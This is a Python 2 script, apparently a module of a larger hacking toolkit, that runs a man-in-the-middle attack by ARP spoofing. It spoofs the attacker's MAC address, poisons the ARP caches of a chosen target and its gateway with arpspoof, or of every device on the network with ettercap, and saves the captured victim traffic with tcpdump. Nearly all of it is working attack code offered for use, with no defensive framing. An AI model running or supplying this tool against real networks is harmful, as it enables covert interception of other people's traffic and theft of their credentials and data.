#!/usr/bin/env python
from __future__ import print_function
import subprocess, re, sys, time, os, thread

''' 
This section of the program conducts a mitm attack by arp spoofing. The
program prompts the user for the target device(s), interface to use, how to
mask the MAC, IP of the target and the gateway, and where you would like to
save the output.

If there are any questions please email me at joejoejoey13@gmail.com. 
'''

short_name = 'mitm'
disp_name = 'Conduct Man-in-the-Middle attack'
otype = 'Routine'
need = ['Would you like to...\n' \
            '1.) Target one device\n' \
            '2.) Target all in range:\n',
        'Which interface would you like to use: ',
        'How would you like to mask the MAC\n' \
            '1.) Set a random vendor MAC same kind\n' \
            '2.) Set a random vendor MAC of any kind\n' \
            '3.) Set fully random MAC\n' \
            '4.) Enter MAC manually :\n',
        'Target IP address:\n',
        'Gateway IP address:\n',
        'Where would you like to save your data:\n']
answers = ['', '', '', '', '', '']
# This section clears any network settings that were used before
if_check = subprocess.check_output('ifconfig -s', shell=True).splitlines()[1:]

# Main definition
def run():
    global answers
    wait_timer('Preparing interface settings...')

    for x in [i for i in if_check if i.startswith('mon')]:
        subprocess.call('sudo airmon-ng stop %s' % x, shell=True)
    for x in [i for i in if_check if i.startswith('wl')]:
        subprocess.call('sudo macchanger -p %s' % x, shell=True)
    subprocess.call('clear', shell=True)

    # This section prompts the user for the needed information
    i = 0
    while i < len(need):
        if i == 1: print('\n'.join(if_check))
        print()
        if (i == 3):
            raw_input('Please connect to the network in which you intend ' \
                      'to mitm on, then press [ENTER] to continue...'),

            # If user enetered option 2 for the first question (target all) 
            # then skip past asking for target and gateway IPs           
            if answers[0] == '2':
                i += 2
                continue
            wait_timer('Scanning network...') 
            
            # Saves a arp scan to vairable ip_check so that users can select 
            # their target and gateway IPs
            ip_check = subprocess.check_output("arp-scan --interface=" \
                        + answers[1] \
                        + " --localnet",
                    shell=True)
        if i == 3 or i == 4: 
            print(ip_check)
        ans = raw_input(need[i])

        if validate(ans, i, if_check):
            i += 1
    # This section conducts the MAC address change before the mitm attack
    if answers[2] == 1: 
        MAC_changer("-a", "")
    if answers[2] == 2: 
        MAC_changer("-A", "")
    if answers[2] == 3: 
        MAC_changer("-r", "")
    if answers[2] == 4:
        while True:
            manual_mac = raw_input("What would you like to change your MAC " \
                    "to?: ")
            if re.match("([a-fA-F0-9]{2}[:|\-]?){6}", manual_mac):
                manual_mac = manual_mac+" "
            MAC_changer("-m", manual_mac)

    # This section attempts to perform the mitm attack by arp spoofing
    try:
        if answers[0] == '1':     # If targeting just one device
            raw_input("Press enter to begin a arp spoof mitm attack " \
                    "against "+answers[3]+" and "+answers[4]+"\n")
            # Starts threads to arp spoof the gateway, arp spoof the target, 
            # and save the output via a tcp dump 
            thread.start_new_thread( arpspoof_tgt_thread,
                    ("Arpspoof Target Thread", ))
            thread.start_new_thread( arpspoof_gtw_thread,
                    ("Arpspoof Gateway Thread", ))
            thread.start_new_thread( tcpdump_thread, ("tcpdump Thread", ) )

        if answers[0] == '2':     # If targeting all
            raw_input("Press enter to being a arp spoof mitm attack against " \
                    "all devices on network.")
            # Starts a thread of capturing all IP traffic in range
            thread.start_new_thread( ettercap_thread, ("Ettercap Thread", ) )
        time.sleep(1)
        print('Man-in-the-middle attack running.\n' \
                'Press [ENTER] to return to main menu.\n\n')
        raw_input("Press [ENTER] to return to the main menu.")
        return
    # If the try statement fails, then conduct the below except statement
    except:
        subprocess.call("sudo macchanger -p "+answers[1], shell=True)
        raw_input("There was an error running the mitm attack. Press enter " \
                "to return to the main menu.")
        return

# Definition to validate user inputs
def validate(ans, i, device_check):
    if i == 0:
        if re.match("[12]", ans): 
            answers[0] = ans
            return True
    if i == 1:
        if ans in device_check:
            answers[1] = ans
            return True
    if i == 2:
        if 0 < int(ans) < 5: 
           answers[2] = ans
           return True
    if i == 3:
        wait_timer('Checking network...')
        ip_check = subprocess.check_output("arp-scan --interface=" \
                +answers[1]+" --localnet", 
            shell=True)
        if (valid_ip(ans)) and (ans in ip_check): 
            answers[3] = ans
            return True
    if i == 4:
        ip_check = subprocess.check_output("arp-scan --interface=" \
                +answers[1]+" --localnet", shell=True)
        if (valid_ip(ans)) and (ans in ip_check):
            answers[4] = ans
            return True
    if i == 5:
        if os.path.isdir(ans):
            output_file = raw_input('What would you like to call your file?\n')
            answers[5] = os.path.join(ans, output_file)
            return True
    return False

# Definition that prints a wait timer
def wait_timer(on_what):
    sys.stdout.write(on_what)
    s='.'
    timer = 4
    while True:
        sys.stdout.write(s)
        sys.stdout.flush()
        time.sleep(0.25)
        timer = timer - 1
        if timer == 0: 
            break

# Definition to validate if a vairable is a valid IP format
def valid_ip(ip):
    parts = ip.split('.')
    return (
        len(parts) == 4
        and all(part.isdigit() for part in parts)
        and all(0 <= int(part) <= 255 for part in parts)
   )

# Definition to start arp spoofing the single target
def arpspoof_tgt_thread(thread_name):
    print("\n"+thread_name+" Started\n")
    subprocess.call("xterm -e arpspoof -i " \
            +answers[1]+" -t "+answers[3]+" "+answers[4], shell=True)
    raw_input("Finished with the target arpspoof, thanks")

# Definition to start arp spoofing the gateway
def arpspoof_gtw_thread(thread_name):
    print("\n"+thread_name+" Started\n")
    subprocess.call("xterm -e arpspoof -i " \
            +answers[1]+" -t "+answers[4]+" "+answers[3], shell=True)
    raw_input("Finished with gateway arpspoof, thanks")

# Definition to start saving all tcp traffic going through the network interface
def tcpdump_thread(thread_name):
    print("\n"+thread_name+" Started\n")
    subprocess.call("xterm -e sudo tcpdump -i " \
            +answers[1]+' -w '+answers[5]+" src "+answers[3]+" and not arp", 
            shell=True)
    raw_input("Finished with saving the tcpdump, thanks")

# Definition that starts arp spoofing all devices within wireless range
def ettercap_thread(thread_name):
    print("\n"+thread_name+" Started\n")
    subprocess.call("xterm -e sudo ettercap -T -i " \
            +answers[1]+' -w '+answers[5]+" -M ARP // // output", shell=True)
    raw_input("Finished with ettercap, thanks")

# Definition to change your MAC address based on the users input
def MAC_changer(mitm_option, manual_mac):
    os.system("ifconfig %s down" % answers[1])
    os.system("macchanger %s %s%s" % (mitm_option, manual_mac, answers[1]))
    os.system("ifconfig %s up" % answers[1])
